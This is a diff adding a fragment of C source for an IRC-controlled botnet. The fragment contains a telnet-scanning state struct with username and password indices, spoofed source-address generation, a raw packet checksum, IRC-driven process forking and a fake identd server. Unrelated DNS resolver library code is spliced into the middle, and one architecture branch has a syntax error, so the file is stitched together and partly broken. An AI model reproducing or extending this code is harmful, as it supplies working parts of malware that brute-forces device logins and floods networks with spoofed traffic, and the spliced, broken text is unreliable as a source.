@@ -1,0 +1,300 @@
+struct ipstate_t 
+{
+    int fd;
+    unsigned int ip;
+    unsigned char state;
+    unsigned char complete;
+    unsigned char usernameInd;
+    unsigned char passwordInd;
+    unsigned char tempDirInd;
+    unsigned int totalTimeout;
+    unsigned short bufUsed;
+    unsigned int telPort;
+    char *sockbuf;
+};
+ 
+int sock,changeservers=0;
+int *pids, actualparent;
+char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256], dispass[256];
+ 
+//unsigned int *pids;
+unsigned long spoofs=0, spoofsm=0, numpids=0;
+ 
+char *getBuild() { 
+    #if defined(__x86_64__) || defined(_M_X64)
+    return "x86_64";
+    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
+    return "x86_32";
+    #elif defined(__ARM_ARCH_2__)
+    return "ARM2";
+    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
+    return "ARM3";
+    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
+    return "ARM4T";
+    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
+    return "ARM5"
+    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
+    return "ARM6T2";
+    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
+    return "ARM6";
+    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
+    return "ARM7";
+    #elif defined(__aarch64__)
+    return "ARM64";
+    #elif defined(mips) || defined(__mips__) || defined(__mips)
+    return "MIPS";
+    #elif defined(__sh__)
+    return "SUPERH";
+    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
+    return "POWERPC";
+    #elif defined(__sparc__) || defined(__sparc)
+    return "SPARC";
+    #elif defined(__m68k__)
+    return "M68K";
+    #else
+    return "UNKNOWN";
+    #endif
+}
+static struct hostent *fake_hostent(const char *hostname, struct in_addr addr,
+                                    struct hostent *result, char *buf,
+                                    int bufsize, int *errval);
+static struct hostent *file_find_name(const char *name, struct hostent *result,
+                                      char *buf, int bufsize, int *errval);
+ 
+struct hostent *gethostbyname(const char *hostname)
+{
+    struct res_data *data = _res_init();
+ 
+    if (!data)
+        return NULL;
+    if (!data->buf) {
+        data->buf = malloc(sizeof(struct hostent) + HOST_BUFSIZE);
+        if (!data->buf) {
+            errno = 0;
+            data->errval = NO_RECOVERY;
+            return NULL;
+        }
+    }
+    return gethostbyname_r(hostname, (struct hostent *) data->buf,
+                           data->buf + sizeof(struct hostent), HOST_BUFSIZE,
+                           &data->errval);
+}
+ 
+struct hostent *gethostbyname_r(const char *hostname, struct hostent *result,
+                                char *buf, int bufsize, int *errval)
+{
+    struct in_addr addr;
+    querybuf qbuf;
+    const char *p;
+    int n;
+ 
+    
+    errno = 0;
+    *errval = NO_RECOVERY;
+    
+    
+    if (isdigit(hostname[0])) {
+        p = hostname;
+        while (*p && (isdigit(*p) || *p == '.'))
+            p++;
+        if (!*p && p[-1] != '.') {
+            
+            if (inet_aton(hostname, &addr) == -1) {
+                *errval = HOST_NOT_FOUND;
+                return NULL;
+            }
+            return fake_hostent(hostname, addr, result, buf, bufsize, errval);
+        }
+    }
+    
+    
+    n = res_search(hostname, C_IN, T_A, qbuf.buf, sizeof(qbuf));
+    if (n >= 0)
+        return _res_parse_answer(&qbuf, n, 0, result, buf, bufsize, errval);
+    else if (errno == ECONNREFUSED)
+        return file_find_name(hostname, result, buf, bufsize, errval);
+    else
+        return NULL;
+}
+ 
+static struct hostent *fake_hostent(const char *hostname, struct in_addr addr,
+                                    struct hostent *result, char *buf,
+                                    int bufsize, int *errval)
+{
+    int len = strlen(hostname);
+    char *name, *addr_ptr;
+ 
+    if (SP(SP(SP(buf, char, len + 1), addr, 1), char *, 3) > buf + bufsize) {
+        errno = ERANGE;
+        return NULL;
+    }
+ 
+   
+    strcpy(buf, hostname);
+    name = buf;
+    buf = ALIGN(buf + len + 1, addr);
+    *((struct in_addr *) buf) = addr;
+    addr_ptr = buf;
+    buf = ALIGN(buf + sizeof(addr), char *);
+    ((char **) buf)[0] = addr_ptr;
+    ((char **) buf)[1] = NULL;
+    ((char **) buf)[2] = NULL;
+ 
+    result->h_name = name;
+    result->h_aliases = ((char **) buf) + 2;
+    result->h_addrtype = AF_INET;
+    result->h_length = sizeof(addr);
+    result->h_addr_list = (char **) buf;
+ 
+    return result;
+}
+ 
+static struct hostent *file_find_name(const char *name, struct hostent *result,
+                                      char *buf, int bufsize, int *errval)
+{
+    char **alias;
+    FILE *fp = NULL;
+ 
+    sethostent(0);
+    while ((result = gethostent_r(result, buf, bufsize, errval)) != NULL) {
+        
+        if (strcasecmp(result->h_name, name) == 0)
+            break;
+        for (alias = result->h_aliases; *alias; alias++) {
+            if (strcasecmp(*alias, name) == 0)
+                break;
+        }
+    }
+    if (!result && errno != ERANGE)
+        *errval = HOST_NOT_FOUND;
+    return result;
+}
+ 
+u_char rseed[4096];
+int rsi, rnd, pid;
+ 
+// Calculates the checksum of the ip header.
+unsigned short csum(unsigned short *ptr,int nbytes) {
+    register long sum;
+    unsigned short oddbyte;
+    register short answer;
+ 
+    sum=0;
+    while(nbytes>1) {
+        sum+=*ptr++;
+        nbytes-=2;
+    }
+    if(nbytes==1) {
+        oddbyte=0;
+        *((u_char*)&oddbyte)=*(u_char*)ptr;
+        sum+=oddbyte;
+    }
+ 
+    sum = (sum>>16)+(sum & 0xffff);
+    sum = sum + (sum>>16);
+    answer=(short)~sum;
+    return(answer);
+}
+ 
+int strwildmatch(const char* pattern, const char* string) {
+    switch(*pattern) {
+        case '\0': return *string;
+        case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
+        case '?': return !(*string && !strwildmatch(pattern+1, string+1));
+        default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
+    }
+}
+ 
+int Send(int sock, char *words, ...) {
+        static char textBuffer[1024];
+        va_list args;
+        va_start(args, words);
+        vsprintf(textBuffer, words, args);
+        va_end(args);
+        return write(sock,textBuffer,strlen(textBuffer));
+}
+ 
+int mfork(char *sender) {
+    unsigned int parent, *newpids, i;
+    if(disabled == 1) {
+        Send(sock, "NOTICE %s :Unable to comply.\n", sender);
+        return 1;
+    }
+    parent=fork();
+    if(parent <= 0) return parent;
+    numpids++;
+    newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
+    for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
+    newpids[numpids-1]=parent;
+    free(pids);
+    pids=newpids;
+    return parent;
+}
+ 
+unsigned long getspoof() {
+    if(!spoofs) return rand();
+    if(spoofsm == 1) return ntohl(spoofs);
+    return ntohl(spoofs+(rand() % spoofsm)+1);
+}
+ 
+void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
+ 
+char *randstring(int length) {    
+    srand(time(NULL));
+    char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    size_t stringLen = 26*2+10;        
+    char *randomString;
+ 
+    randomString = malloc(sizeof(char) * (length +1));
+ 
+    if(!randomString) {
+        return (char*)0;
+    }
+ 
+    unsigned int key = 0;
+    
+    int n;
+ 
+    for (n = 0;n < length;n++) {            
+        key = rand() % stringLen;          
+        randomString[n] = charset[key];
+    }
+ 
+    randomString[length] = '\0';
+ 
+    return randomString;
+}
+ 
+void identd() {
+        int sockname,sockfd,sin_size,tmpsock,i;
+        struct sockaddr_in my_addr,their_addr;
+        char szBuffer[1024];
+        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
+        my_addr.sin_family = AF_INET;
+        my_addr.sin_port = htons(113);
+        my_addr.sin_addr.s_addr = INADDR_ANY;
+        memset(&(my_addr.sin_zero), 0, 8);
+        if(bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
+        if(listen(sockfd, 1) == -1) return;
+        if(fork() == 0) return;
+        sin_size = sizeof(struct sockaddr_in);
+        if((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
+        for(;;) {
+                fd_set bla;
+                struct timeval timee;
+                FD_ZERO(&bla);
+                FD_SET(tmpsock,&bla);
+                timee.tv_sec=timee.tv_usec=60;
+                if(select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
+                if(FD_ISSET(tmpsock,&bla)) break;
+        }
+        i = recv(tmpsock,szBuffer,1024,0);
+        if(i <= 0 || i >= 20) exit(0);
+        szBuffer[i]=0;
+        if(szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
+        if(szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
+    Send(tmpsock, "%s : USERID : UNIX : %s\n",szBuffer,ident);
+        close(tmpsock);
+        close(sockfd);
+        exit(0);
+}
